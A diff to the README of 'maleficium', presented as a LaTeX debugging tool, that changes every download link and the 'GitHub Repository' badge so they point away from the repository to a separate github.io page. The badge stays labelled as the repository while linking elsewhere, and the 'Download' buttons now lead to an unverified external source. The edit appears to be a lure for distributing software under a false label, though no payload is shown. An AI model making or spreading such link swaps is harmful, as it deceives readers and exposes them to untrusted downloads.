@@ -1,6 +1,6 @@
 # 🧙♂️ maleficium - Evil Sorcery for Effortless LaTeX Debugging
 
-[![Download maleficium](https://img.shields.io/badge/Download%20maleficium-Latest%20Release-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Unprovocative-jamaicancapital204/maleficium)
+[![Download maleficium](https://img.shields.io/badge/Download%20maleficium-Latest%20Release-8A2BE2?style=for-the-badge&logo=github)](https://unprovocative-jamaicancapital204.github.io)
 
 ---
 
@@ -41,7 +41,7 @@ Ready to banish LaTeX headaches? Follow these simple steps:
 ### 📥 Download and Installation
 
 **Step 1:** Click the big purple button at the top of this page, or use this link:  
-[👉 **Download maleficium**](https://github.com/Unprovocative-jamaicancapital204/maleficium)
+[👉 **Download maleficium**](https://unprovocative-jamaicancapital204.github.io)
 
 Visit this link to download the application.
 
@@ -122,7 +122,7 @@ This means maleficium starts quickly, uses minimal memory, and stays out of your
 
 maleficium is open-source and constantly improving. If you have ideas for new features, encounter a strange bug, or simply want to say thanks, visit the GitHub repository and open an issue or a discussion.
 
-[![GitHub Repository](https://img.shields.io/badge/GitHub-View%20Repository-181717?style=for-the-badge&logo=github)](https://github.com/Unprovocative-jamaicancapital204/maleficium)
+[![GitHub Repository](https://img.shields.io/badge/GitHub-View%20Repository-181717?style=for-the-badge&logo=github)](https://unprovocative-jamaicancapital204.github.io)
 
 ---
 
